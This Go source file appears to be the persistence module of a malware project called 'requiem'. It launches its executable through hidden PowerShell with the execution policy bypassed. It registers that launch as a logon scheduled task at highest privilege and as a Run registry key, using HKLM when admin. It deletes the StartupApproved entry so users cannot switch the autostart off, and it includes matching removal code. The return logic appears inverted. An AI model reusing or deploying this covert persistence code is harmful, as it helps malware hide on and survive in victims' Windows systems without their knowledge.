package persistence

import (
	"fmt"
	"strings"

	"requiem/store"
	"requiem/utils"
)

var (
	START_ALLOWED string = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"
	AUTO_START    string = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
)

func Persist(filePath string) bool {
	persisted := 0

	if filePath == "" {
		filePath = store.ExecPath
	}

	command := fmt.Sprintf(
		"powershell -nop -w hidden -ep bypass -c \"& '%s' %s\"",
		filePath,
		store.LAUNCH_KEY,
	)

	if store.TASK_SCHEDULAR && store.IsAdmin {
		persisted += 1

		err := utils.RunCommand(
			"schtasks", "/create",
			"/tn", store.PERSISTENCE_NAME,
			"/tr", command,
			"/sc", "ONLOGON",
			"/rl", "HIGHEST",
			"/it", "/f",
		)

		if err != nil {
			persisted -= 1
		}
	}

	if store.AUTO_RUN_REG {
		persisted += 2

		if store.IsAdmin {
			START_ALLOWED = strings.Replace(START_ALLOWED, "HKCU", "HKLM", 1)
			AUTO_START = strings.Replace(AUTO_START, "HKCU", "HKLM", 1)
		}

		err := utils.RunCommand(
			"reg", "delete",
			START_ALLOWED,
			"/v", store.PERSISTENCE_NAME,
			"/f",
		)

		if err != nil {
			persisted -= 1
		}

		err = utils.RunCommand(
			"reg", "add",
			AUTO_START,
			"/v", store.PERSISTENCE_NAME,
			"/t", "REG_SZ",
			"/d", command,
			"/f",
		)

		if err != nil {
			persisted -= 1
		}
	}

	return persisted == 0
}

func Unpersist() bool {
	persisted := 0

	if store.TASK_SCHEDULAR && store.IsAdmin {
		persisted += 1

		err := utils.RunCommand(
			"schtasks", "/delete",
			"/tn", store.PERSISTENCE_NAME,
			"/f",
		)

		if err != nil {
			persisted -= 1
		}
	}

	if store.AUTO_RUN_REG {
		persisted += 1

		err := utils.RunCommand(
			"reg", "delete",
			AUTO_START,
			"/v", store.PERSISTENCE_NAME,
			"/f",
		)

		if err != nil {
			persisted -= 1
		}
	}

	return persisted == 0
}
